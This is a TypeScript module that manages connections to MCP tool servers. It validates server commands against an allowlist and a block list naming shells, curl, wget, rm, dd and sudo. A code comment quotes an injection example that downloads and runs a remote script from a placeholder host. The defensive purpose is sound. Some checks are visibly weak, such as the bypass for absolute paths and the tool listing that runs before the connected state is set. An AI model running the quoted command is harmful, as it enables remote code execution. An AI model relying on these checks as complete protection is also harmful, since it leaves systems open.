import { spawn, type ChildProcess } from 'child_process';
import * as path from 'path';
import type { MCPServerConfig, ToolDefinition } from '../core/types.js';
import { MCPTool } from '../tools/base-tool.js';
import { parseJson } from '../utils/json.js';

/**
 * CRITICAL: Allowed MCP server commands — only known-safe executables.
 * Blocks arbitrary command execution via MCP config injection.
 */
const ALLOWED_MCP_COMMANDS = new Set([
  'node',
  'npx',
  'bun',
  'python',
  'python3',
  'uv',
  'deno',
]);

/**
 * CRITICAL: Blocked command patterns — shell interpreters and dangerous executables.
 * These are NEVER allowed regardless of the allowlist.
 */
const BLOCKED_MCP_PATTERNS = [
  /sh$/i,
  /bash$/i,
  /zsh$/i,
  /cmd$/i,
  /powershell$/i,
  /pwsh$/i,
  /curl$/i,
  /wget$/i,
  /rm$/i,
  /dd$/i,
  /format$/i,
  /sudo$/i,
];

/**
 * CRITICAL: Validate that an MCP server command is allowed.
 * Checks against the allowlist and blocked patterns to prevent command injection.
 * Throws if the command is not allowed.
 */
function validateMCPCommand(name: string, command: string): void {
  const basename = path.basename(command).toLowerCase();

  // Block shell interpreters and dangerous commands
  for (const pattern of BLOCKED_MCP_PATTERNS) {
    if (pattern.test(basename)) {
      throw new Error(
        `MCP server "${name}" uses command "${command}" which is blocked for security reasons.`,
      );
    }
  }

  // Allow if basename is in the allowlist
  if (ALLOWED_MCP_COMMANDS.has(basename)) {
    return;
  }

  // Allow absolute paths to executables that exist on disk
  // Defense-in-depth: only if the basename itself is not blocked
  if (path.isAbsolute(command)) {
    try {
      require('fs').accessSync(command, require('fs').constants.X_OK);
      return;
    } catch {
      throw new Error(
        `MCP server "${name}" command "${command}" was not found or is not executable.`,
      );
    }
  }

  throw new Error(
    `MCP server "${name}" command "${command}" is not in the allowed list. ` +
      `Allowed commands: ${[...ALLOWED_MCP_COMMANDS].sort().join(', ')}.`,
  );
}

/**
 * CRITICAL: Sanitize MCP server args to prevent command injection.
 * Each arg is checked for shell metacharacters. If any are found, the arg is rejected.
 * This prevents injection via MCP config args like: -c 'curl evil.com/shell.sh | bash'
 */
function sanitizeMCPArgs(name: string, args: string[]): void {
  for (let i = 0; i < args.length; i++) {
    const arg = args[i];
    // Allow through known-safe patterns first
    const stripped = arg
      .replace(/"[^"]*"/g, '""')
      .replace(/'[^']*'/g, "''");

    // Check for shell metacharacters outside quotes
    if (/[;|&`$(){}<>!#\[\]*~]/.test(stripped)) {
      throw new Error(
        `MCP server arg[${i}] contains shell metacharacters: "${arg.substring(0, 50)}". ` +
          `Args must not contain shell metacharacters to prevent command injection.`,
      );
    }
  }
  // Reject path traversal in args
  for (const arg of args) {
    if (arg.includes('..') && (arg.includes('/') || arg.includes('\\'))) {
      throw new Error(
        `MCP server arg contains path traversal: "${arg.substring(0, 50)}".`,
      );
    }
  }
}

/**
 * Manages connections to MCP servers
 * Allows DynaMind Terminal to use tools from external MCP servers
 */
export class MCPClientManager {
  private clients: Map<string, MCPClientConnection> = new Map();
  private config?: {
    heartbeatInterval?: number;
    responseTimeout?: number;
    maxReconnectionAttempts?: number;
    reconnectionDelay?: number;
  };

  constructor(config?: {
    heartbeatInterval?: number;
    responseTimeout?: number;
    maxReconnectionAttempts?: number;
    reconnectionDelay?: number;
  }) {
    this.config = config;
  }

  /**
   * Connect to an MCP server
   */
  async connect(name: string, config: MCPServerConfig, projectDir?: string): Promise<void> {
    if (this.clients.has(name)) {
      console.warn(`MCP server ${name} already connected, reconnecting...`);
      await this.disconnect(name);
    }

    const connection = new MCPClientConnection(name, config, projectDir, this.config);
    await connection.connect();
    this.clients.set(name, connection);
  }

  /**
   * Disconnect from an MCP server
   */
  async disconnect(name: string): Promise<void> {
    const connection = this.clients.get(name);
    if (connection) {
      await connection.disconnect();
      this.clients.delete(name);
    }
  }

  /**
   * Disconnect from all servers
   */
  async disconnectAll(): Promise<void> {
    const disconnections = Array.from(this.clients.keys()).map((name) => this.disconnect(name));
    await Promise.all(disconnections);
  }

  /**
   * Get all tools from connected MCP servers as DynaMind tools
   */
  async getTools(): Promise<MCPTool[]> {
    const allTools: MCPTool[] = [];

    for (const [name, connection] of this.clients) {
      try {
        const tools = await connection.getTools();
        allTools.push(...tools);
      } catch (err) {
        console.error(`Failed to get tools from MCP server ${name}:`, err);
      }
    }

    return allTools;
  }

  /**
   * Get connected server names
   */
  getConnectedServers(): string[] {
    return Array.from(this.clients.keys());
  }

  /**
   * Check if a server is connected
   */
  isConnected(name: string): boolean {
    return this.clients.has(name);
  }

  /**
   * Get connection status for all servers
   */
  getServerStatus(): Record<
    string,
    {
      connected: boolean;
      responseTime: number;
      toolsAvailable: number;
      lastError?: string;
    }
  > {
    const status: Record<string, any> = {};
    for (const [name, connection] of this.clients) {
      status[name] = connection.getConnectionStatus();
    }
    return status;
  }

  /**
   * Restart a specific server
   */
  async restartServer(
    name: string
  ): Promise<{ success: boolean; message?: string; error?: string }> {
    const connection = this.clients.get(name);
    if (!connection) {
      return { success: false, error: `Server ${name} not found` };
    }

    try {
      const config = connection.getConfig();
      const projectDir = connection.getProjectDir();
      await this.disconnect(name);
      await new Promise((resolve) => setTimeout(resolve, 1000)); // Brief delay
      await this.connect(name, config, projectDir);
      return { success: true, message: 'Server restarted successfully' };
    } catch (error: any) {
      return { success: false, error: error?.message || 'Unknown error' };
    }
  }

  /**
   * Trigger health check for all servers
   */
  async triggerHealthCheck(): Promise<void> {
    const healthChecks = Array.from(this.clients.values()).map(async (connection) => {
      try {
        await connection.performHealthCheck();
      } catch (error) {
        console.error(`Health check failed for ${connection.name}:`, error);
      }
    });

    await Promise.all(healthChecks);
  }
}

/**
 * JSON-RPC message types for MCP protocol
 */
interface JsonRpcRequest {
  jsonrpc: '2.0';
  id: number;
  method: string;
  params?: Record<string, unknown>;
}

interface JsonRpcResponse {
  jsonrpc: '2.0';
  id: number;
  result?: unknown;
  error?: { code: number; message: string };
}

type ConnectionState = 'disconnected' | 'connecting' | 'connected' | 'error' | 'reconnecting';

/**
 * Individual MCP server connection using JSON-RPC over stdio
 */
class MCPClientConnection {
  public name: string;
  private config: MCPServerConfig;
  private process: ChildProcess | null = null;
  private state: ConnectionState = 'disconnected';
  private requestId: number = 0;
  private pendingRequests: Map<
    number,
    {
      resolve: (value: unknown) => void;
      reject: (error: Error) => void;
      timeout: NodeJS.Timeout;
    }
  > = new Map();
  private buffer: string = '';
  private tools: any[] = [];

  // Enhanced connection management
  private lastHeartbeat: number = 0;
  private heartbeatInterval: NodeJS.Timeout | null = null;
  private reconnectionAttempts: number = 0;
  private maxReconnectionAttempts: number = 3;
  private reconnectionDelay: number = 1000;
  private reconnectionBackoff: number = 2;
  private connectionStartTime: number = 0;
  private totalUptime: number = 0;
  private errorCount: number = 0;
  private lastError: string | null = null;

  // Configuration
  private heartbeatIntervalMs: number;
  private responseTimeoutMs: number;

  constructor(
    name: string,
    config: MCPServerConfig,
    private projectDir?: string,
    managerConfig?: {
      heartbeatInterval?: number;
      responseTimeout?: number;
      maxReconnectionAttempts?: number;
      reconnectionDelay?: number;
      reconnectionBackoff?: number;
    }
  ) {
    this.name = name;
    this.config = config;
    this.heartbeatIntervalMs = managerConfig?.heartbeatInterval || 30000;
    this.responseTimeoutMs = managerConfig?.responseTimeout || 10000;
    this.maxReconnectionAttempts = managerConfig?.maxReconnectionAttempts || 3;
    this.reconnectionDelay = managerConfig?.reconnectionDelay || 1000;
    this.reconnectionBackoff = managerConfig?.reconnectionBackoff || 2;
  }

  async connect(): Promise<void> {
    this.setState('connecting');

    try {
      await this.startProcess();
      await this.initializeConnection();
      await this.startHeartbeat();
      this.setState('connected');
    } catch (error) {
      this.handleError(error as Error);
      throw error;
    }
  }

  /**
   * Start the MCP server process
   */
  private async startProcess(): Promise<void> {
    // Always use absolute paths for reliability
    const resolvedArgs = this.config.args.map((arg) => {
      if (arg.startsWith('./') || arg.startsWith('../')) {
        // Convert relative path to absolute path from project directory
        if (this.projectDir) {
          return path.resolve(this.projectDir, arg);
        } else {
          return path.resolve(process.cwd(), arg);
        }
      }
      return arg;
    });

    console.log(`[MCP] Starting: ${this.config.command} ${resolvedArgs.join(' ')}`);
    console.log(`[MCP] Working dir: ${this.projectDir || process.cwd()}`);

    // CRITICAL: Validate the MCP server command before spawning
    // This prevents command injection via MCP configuration files
    validateMCPCommand(this.name, this.config.command);

    // CRITICAL: Sanitize args to prevent shell injection through arg values
    sanitizeMCPArgs(this.name, resolvedArgs);

    // Spawn the MCP server process with shell:false (the default)
    // Using explicit command + args array prevents shell interpretation of metacharacters
    const options: any = {
      env: { ...process.env, ...this.config.env },
      stdio: ['pipe', 'pipe', 'pipe'],
      // shell:false is the default for spawn() — explicitly don't use shell
    };

    // Always set working directory for consistency
    if (this.projectDir) {
      options.cwd = this.projectDir;
    } else {
      options.cwd = process.cwd();
    }

    this.process = spawn(this.config.command, resolvedArgs, options);

    // Handle stdout (JSON-RPC responses)
    this.process.stdout?.on('data', (data: Buffer) => {
      this.handleData(data.toString());
    });

    // Handle stderr (for debugging)
    this.process.stderr?.on('data', (data: Buffer) => {
      console.error(`[MCP ${this.name}] ${data.toString()}`);
    });

    // Handle process errors
    this.process.on('error', (err) => {
      this.handleError(err);
    });

    this.process.on('exit', (code) => {
      if (code !== 0) {
        console.error(`MCP server ${this.name} exited with code ${code}`);
      }
      this.handleError(new Error(`Process exited with code ${code}`));
    });
  }

  /**
   * Initialize the MCP connection
   */
  private async initializeConnection(): Promise<void> {
    if (!this.process?.stdin) {
      throw new Error('Process not running');
    }

    // Initialize connection
    await this.sendRequest('initialize', {
      protocolVersion: '2024-11-05',
      capabilities: {},
      clientInfo: {
        name: `dynamind-terminal-${this.name}`,
        version: '0.1.0',
      },
    });

    // Send initialized notification
    this.sendNotification('notifications/initialized', {});

    // Load tools
    await this.listTools();
  }

  /**
   * Start heartbeat monitoring
   */
  private startHeartbeat(): void {
    this.lastHeartbeat = Date.now();

    this.heartbeatInterval = setInterval(() => {
      this.performHeartbeatCheck();
    }, this.heartbeatIntervalMs);
  }

  /**
   * Stop heartbeat monitoring
   */
  private stopHeartbeat(): void {
    if (this.heartbeatInterval) {
      clearInterval(this.heartbeatInterval);
      this.heartbeatInterval = null;
    }
  }

  private handleData(data: string): void {
    this.buffer += data;

    // Try to parse complete JSON-RPC messages
    const lines = this.buffer.split('\n');
    this.buffer = lines.pop() || '';

    for (const line of lines) {
      if (!line.trim()) continue;

      try {
        const response = parseJson<JsonRpcResponse>(line);
        if (!response) {
          // Not valid JSON, skip
          continue;
        }

        if (response.id !== undefined) {
          const pending = this.pendingRequests.get(response.id);
          if (pending) {
            this.pendingRequests.delete(response.id);

            if (response.error) {
              pending.reject(new Error(response.error.message));
            } else {
              pending.resolve(response.result);
            }
          }
        }
      } catch {
        // Not valid JSON, skip
      }
    }
  }

  private sendRequest(method: string, params?: Record<string, unknown>): Promise<unknown> {
    return new Promise((resolve, reject) => {
      if (!this.process?.stdin) {
        reject(new Error('Process not running'));
        return;
      }

      const id = ++this.requestId;
      const request: JsonRpcRequest = {
        jsonrpc: '2.0',
        id,
        method,
        params,
      };

      this.pendingRequests.set(id, {
        resolve,
        reject,
        timeout: setTimeout(() => {
          this.pendingRequests.delete(id);
          reject(new Error(`Request ${method} timed out`));
        }, this.responseTimeoutMs),
      });

      this.process.stdin.write(JSON.stringify(request) + '\n');
    });
  }

  private sendNotification(method: string, params?: Record<string, unknown>): void {
    if (!this.process?.stdin) return;

    const notification = {
      jsonrpc: '2.0',
      method,
      params,
    };

    this.process.stdin.write(JSON.stringify(notification) + '\n');
  }

  async disconnect(): Promise<void> {
    this.stopHeartbeat();

    if (this.process) {
      this.process.kill();
      this.process = null;
    }

    this.setState('disconnected');
    this.pendingRequests.clear();
  }

  /**
   * Get tools from this MCP server as DynaMind MCPTools
   */
  async getTools(): Promise<MCPTool[]> {
    if (!this.isConnected) {
      throw new Error(`MCP server ${this.name} is not connected`);
    }

    const response = (await this.sendRequest('tools/list', {})) as {
      tools: Array<{
        name: string;
        description?: string;
        inputSchema: ToolDefinition['inputSchema'];
      }>;
    };

    const tools: MCPTool[] = [];

    for (const toolDef of response.tools || []) {
      const definition: ToolDefinition = {
        name: toolDef.name,
        description: toolDef.description || '',
        inputSchema: toolDef.inputSchema,
      };

      const tool = new MCPTool(this.name, definition, async (input) => {
        return this.callTool(toolDef.name, input);
      });

      tools.push(tool);
    }

    return tools;
  }

  /**
   * Call a tool on this MCP server
   */
  private async callTool(name: string, args: Record<string, unknown>): Promise<unknown> {
    if (!this.isConnected) {
      throw new Error(`MCP server ${this.name} is not connected`);
    }

    const result = (await this.sendRequest('tools/call', {
      name,
      arguments: args,
    })) as { content?: Array<{ type: string; text?: string }> };

    // Extract text content from result
    if (result.content && Array.isArray(result.content)) {
      const textContents = result.content
        .filter(
          (c): c is { type: 'text'; text: string } =>
            c.type === 'text' && typeof c.text === 'string'
        )
        .map((c) => c.text);

      if (textContents.length > 0) {
        return textContents.join('\n');
      }
    }

    return result;
  }

  get isConnected(): boolean {
    return this.state === 'connected';
  }

  /**
   * Get connection status
   */
  getConnectionStatus() {
    return {
      connected: this.state === 'connected',
      responseTime: 0, // Updated during health checks
      toolsAvailable: this.tools.length,
      lastError: this.lastError,
      uptime: this.totalUptime,
      errorCount: this.errorCount,
      reconnectionAttempts: this.reconnectionAttempts,
    };
  }

  /**
   * Get config for restart
   */
  getConfig(): MCPServerConfig {
    return this.config;
  }

  /**
   * Get project directory for restart
   */
  getProjectDir(): string | undefined {
    return this.projectDir;
  }

  /**
   * Perform health check
   */
  async performHealthCheck(): Promise<void> {
    if (this.state !== 'connected') {
      return;
    }

    const startTime = Date.now();

    try {
      // Simulate health check by listing tools
      await this.listTools();
      const responseTime = Date.now() - startTime;

      // Update connection status with health check results
      console.log(`[MCP ${this.name}] Health check passed in ${responseTime}ms`);
    } catch (error) {
      this.handleError(error as Error);
    }
  }

  /**
   * List tools from the MCP server
   */
  private async listTools(): Promise<void> {
    if (!this.isConnected) {
      throw new Error(`MCP server ${this.name} is not connected`);
    }

    const response = (await this.sendRequest('tools/list', {})) as {
      tools: Array<{
        name: string;
        description?: string;
        inputSchema: ToolDefinition['inputSchema'];
      }>;
    };

    const newTools: any[] = [];

    for (const toolDef of response.tools || []) {
      const definition: ToolDefinition = {
        name: toolDef.name,
        description: toolDef.description || '',
        inputSchema: toolDef.inputSchema,
      };

      const tool = new MCPTool(this.name, definition, async (input) => {
        return this.callTool(toolDef.name, input);
      });

      newTools.push(tool);
    }

    this.tools = newTools;
  }

  /**
   * Set connection state
   */
  private setState(newState: ConnectionState): void {
    const oldState = this.state;
    this.state = newState;

    if (oldState !== 'connected' && newState === 'connected') {
      this.connectionStartTime = Date.now();
    }

    if (oldState === 'connected' && newState !== 'connected') {
      if (this.connectionStartTime > 0) {
        this.totalUptime += Date.now() - this.connectionStartTime;
      }
      this.connectionStartTime = 0;
    }
  }

  /**
   * Handle connection errors
   */
  private handleError(error: Error): void {
    this.errorCount++;
    this.lastError = error.message;

    console.error(`MCP server ${this.name} error:`, error);

    // If connected and error occurs, attempt reconnection
    if (this.state === 'connected') {
      this.setState('error');

      // Only attempt reconnection if within limits
      if (this.reconnectionAttempts < this.maxReconnectionAttempts) {
        setTimeout(() => {
          this.attemptReconnection();
        }, this.reconnectionDelay);
      }
    }
  }

  /**
   * Attempt to reconnect
   */
  private async attemptReconnection(): Promise<void> {
    if (this.reconnectionAttempts >= this.maxReconnectionAttempts) {
      console.error(`Max reconnection attempts reached for ${this.name}`);
      this.setState('error');
      return;
    }

    this.reconnectionAttempts++;
    this.setState('reconnecting');

    console.log(
      `Attempting reconnection ${this.reconnectionAttempts}/${this.maxReconnectionAttempts} for ${this.name}...`
    );

    try {
      // Disconnect current process
      if (this.process) {
        this.process.kill();
        this.process = null;
      }

      // Wait before reconnection
      await new Promise((resolve) => setTimeout(resolve, this.reconnectionDelay));

      // Reconnect
      await this.startProcess();
      await this.initializeConnection();
      await this.startHeartbeat();

      // Reset reconnection attempts on success
      this.reconnectionAttempts = 0;
      this.reconnectionDelay = 1000; // Reset delay

      this.setState('connected');

      console.log(`Successfully reconnected to ${this.name}`);
    } catch (error) {
      // Increase delay for next attempt
      this.reconnectionDelay *= this.reconnectionBackoff;
      this.handleError(error as Error);
    }
  }

  /**
   * Perform heartbeat check
   */
  private async performHeartbeatCheck(): Promise<void> {
    if (this.state !== 'connected') {
      return;
    }

    try {
      await this.performHealthCheck();
    } catch (error) {
      console.error(`Heartbeat check failed for ${this.name}:`, error);
    }
  }
}

/**
 * Helper to load MCP server configs from a config file format
 */
export function parseMCPConfig(
  config: Record<string, { command: string; args?: string[]; env?: Record<string, string> }>
): Record<string, MCPServerConfig> {
  const result: Record<string, MCPServerConfig> = {};

  for (const [name, serverConfig] of Object.entries(config)) {
    result[name] = {
      command: serverConfig.command,
      args: serverConfig.args || [],
      env: serverConfig.env,
    };
  }

  return result;
}

